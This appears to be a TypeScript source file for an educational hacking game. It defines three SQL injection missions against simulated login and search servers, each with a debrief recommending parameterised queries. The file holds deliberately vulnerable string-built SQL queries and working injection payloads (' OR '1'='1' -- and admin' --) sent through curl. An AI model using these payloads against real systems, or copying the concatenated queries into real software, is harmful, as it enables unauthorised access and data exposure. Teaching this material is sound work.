/**
 * SQL injection, against a simulated vulnerable login and search. The toy server
 * builds its query by pasting your input straight into the SQL string, so a
 * quote lets you change what the query means. The real SQL engine
 * (src/lib/shell/sql.ts) runs it, so the injection behaves as it would for real.
 * The fix, in every debrief: parameterised queries, which never mix code and data.
 */
import { runQuery, type Table } from "@/lib/shell/sql";
import { flagFrom, submitted, type Mission } from "../kit";
import { attackBox, bad, ok, notFound, token } from "./kit";
import type { Site } from "@/lib/shell/http";

/** Runs a query the vulnerable way and hands back rows, or the leaked error text. */
function vulnerable(tables: Table[], sql: string): { rows: (string | number | null)[][]; error?: string } {
  try {
    return { rows: runQuery(tables, sql).rows };
  } catch (e) {
    return { rows: [], error: e instanceof Error ? e.message : "error" };
  }
}

const users = (rows: [string, string, string][]): Table => ({
  name: "users",
  columns: [["user", "TEXT"], ["pass", "TEXT"], ["token", "TEXT"]],
  rows: rows as unknown as (string | number | null)[][],
});

export const SQLI: Mission[] = [
  {
    id: "break-sqli-1",
    title: "Slip past the login",
    brief:
      "`portal.lab` has a staff login at `POST /login` with fields `user` and `pass`. You don't have an account. The server builds its query as `... WHERE user='YOU' AND pass='YOU'`, pasting your text in raw. Make the `WHERE` always true so the first row comes back.",
    greeting: "A classic authentication bypass. The admin account is the first row in the table.",
    hints: [
      "A single quote ends the string the server opened, and `--` turns the rest of the line into a comment.",
      "Try a user of `' OR '1'='1' -- ` and any password.",
      "`curl -s -d \"user=' OR '1'='1' -- &pass=x\" http://portal.lab/login`",
    ],
    build: (rng) => {
      const flag = flagFrom(rng);
      const db = [users([["admin", token(rng), flag], ["ana", token(rng), token(rng)], ["sam", token(rng), token(rng)]])];
      const site: Site = (r) => {
        if (r.path !== "/login") return notFound;
        if (r.method !== "POST") return ok(`<form method="post" action="/login">\n  <input name="user">\n  <input name="pass" type="password">\n</form>\n`);
        const sql = `SELECT user, token FROM users WHERE user='${r.form.user ?? ""}' AND pass='${r.form.pass ?? ""}'`;
        const res = vulnerable(db[0] ? [db[0]] : [], sql);
        if (res.error) return bad(500, `Database error: ${res.error}\nQuery was: ${sql}\n`);
        if (!res.rows.length) return bad(401, "Wrong user or password.\n");
        const [name, tok] = res.rows[0] as [string, string];
        return ok(`Welcome, ${name}. Your session token is ${tok}\n`);
      };
      return { shell: attackBox({ "portal.lab": site }), flag };
    },
    passed: submitted,
    solve: (w) => [`curl -s -d "user=' OR '1'='1' -- &pass=x" http://portal.lab/login`, `submit ${w.flag}`],
    notEnough: () => [`curl -s -d "user=admin&pass=admin" http://portal.lab/login`],
    debrief:
      "The quote broke out of the value and the rest became your code, not data. The one real fix is a parameterised query (`WHERE user = ?`), which sends your input as a value the database never parses as SQL. Escaping quotes by hand is not enough.",
  },
  {
    id: "break-sqli-2",
    title: "Become the admin by name",
    brief:
      "`console.lab` at `POST /login` only shows the admin panel when you come back as the user `admin`. You know the name but not the password. The query is still `... WHERE user='YOU' AND pass='YOU'`. Log in as `admin` without the password.",
    hints: [
      "Comment out the password check: a user of `admin' -- ` ends the name and drops everything after it.",
      "`curl -s -d \"user=admin' -- &pass=x\" http://console.lab/login`",
    ],
    build: (rng) => {
      const flag = flagFrom(rng);
      const realPass = token(rng);
      const db = users([["admin", realPass, flag], ["guest", "guest", token(rng)]]);
      const site: Site = (r) => {
        if (r.path !== "/login") return notFound;
        if (r.method !== "POST") return ok("Admin console. Please log in.\n");
        const sql = `SELECT user, token FROM users WHERE user='${r.form.user ?? ""}' AND pass='${r.form.pass ?? ""}'`;
        const res = vulnerable([db], sql);
        if (res.error) return bad(500, `Database error: ${res.error}\n`);
        const row = res.rows[0] as [string, string] | undefined;
        if (!row) return bad(401, "Login failed.\n");
        if (row[0] !== "admin") return bad(403, `Logged in as ${row[0]}, but this console is admin only.\n`);
        return ok(`Admin console unlocked. Flag: ${row[1]}\n`);
      };
      return { shell: attackBox({ "console.lab": site }), flag, state: { realPass } };
    },
    passed: submitted,
    solve: (w) => [`curl -s -d "user=admin' -- &pass=x" http://console.lab/login`, `submit ${w.flag}`],
    notEnough: (w) => [`curl -s -d "user=guest' -- &pass=x" http://console.lab/login`],
    debrief:
      "`admin' -- ` made the query read `WHERE user='admin'` and commented the password away. Authentication must compare a stored password hash in code, never trust the database to filter it through a string you built.",
  },
  {
    id: "break-sqli-3",
    title: "Empty the shelf",
    brief:
      "`shop.lab` has a search at `GET /search?q=`, which runs `... WHERE name LIKE '%YOUR_Q%'`. One product is marked staff-only and never shows in normal results. Make the search return every row anyway, and read its note.",
    hints: [
      "Break out of the `LIKE` string and add an always-true condition. A URL can't carry raw spaces, so write each one as `%20`.",
      "The payload `x' OR '1'='1' -- ` becomes `x'%20OR%20'1'='1'%20--%20` in the URL.",
      "`curl -s \"http://shop.lab/search?q=x'%20OR%20'1'='1'%20--%20\"`",
    ],
    build: (rng) => {
      const flag = flagFrom(rng);
      const products: Table = {
        name: "products",
        columns: [["name", "TEXT"], ["note", "TEXT"], ["staff_only", "INTEGER"]],
        rows: [
          ["Blue mug", "In stock", 0],
          ["Notebook", "In stock", 0],
          ["Prototype badge", flag, 1],
          ["Desk lamp", "In stock", 0],
        ],
      };
      const site: Site = (r) => {
        if (r.path !== "/search") return notFound;
        const q = r.query.q ?? "";
        const sql = `SELECT name, note FROM products WHERE name LIKE '%${q}%' AND staff_only = 0`;
        const res = vulnerable([products], sql);
        if (res.error) return bad(500, `Database error: ${res.error}\n`);
        if (!res.rows.length) return ok("No products match.\n");
        return ok(`${res.rows.map((row) => `${row[0]} — ${row[1]}`).join("\n")}\n`);
      };
      return { shell: attackBox({ "shop.lab": site }), flag };
    },
    passed: submitted,
    solve: (w) => [`curl -s "http://shop.lab/search?q=x'%20OR%20'1'='1'%20--%20"`, `submit ${w.flag}`],
    notEnough: () => [`curl -s "http://shop.lab/search?q=badge"`],
    debrief:
      "Your `OR '1'='1'` made every row match, and `-- ` cut off the `staff_only = 0` filter that was meant to hide the secret. A parameterised `LIKE ?` would have kept your text as a search term, and the visibility check belongs in a trusted WHERE the user can't comment out.",
  },
];
